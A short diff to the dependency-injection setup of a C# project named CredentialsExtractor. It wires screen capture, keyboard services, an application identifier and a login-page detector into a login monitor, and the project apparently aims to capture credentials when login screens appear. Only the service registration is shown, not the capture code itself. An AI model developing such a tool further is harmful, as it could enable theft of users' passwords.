@@ -1,6 +1,4 @@
-﻿using System;
-using System.Collections.Generic;
-using CredentialsExtractor.Configuration;
+﻿using CredentialsExtractor.Configuration;
 using CredentialsExtractor.Core;
 using CredentialsExtractor.Input;
 using CredentialsExtractor.Logging;
@@ -25,11 +23,19 @@ namespace CredentialsExtractor.DependencyInjection
                 GetService<IKeyboardUtils>(),
                 GetService<ILogger>()));
 
+            // Register app identification service
+            RegisterService<IApplicationIdentifier>(new Win32ApplicationIdentifier(GetService<ILogger>()));
+
             // Register capture and detection services
             RegisterService<IScreenCapture>(new ScreenCapture(config, GetService<ILogger>()));
 
-            // Use DllLoginDetector instead of ExternalProcessLoginDetector
-            RegisterService<ILoginPageDetector>(new DllLoginDetector(config, GetService<ILogger>(), 0.6));
+            // Use DllLoginDetector with keyboard manager and application identifier
+            RegisterService<ILoginPageDetector>(new DllLoginDetector(
+                config,
+                GetService<ILogger>(),
+                GetService<IKeyboardManager>(),
+                GetService<IApplicationIdentifier>(),
+                0.4));
 
             // Register monitor
             RegisterService<ILoginMonitor>(new LoginMonitor(
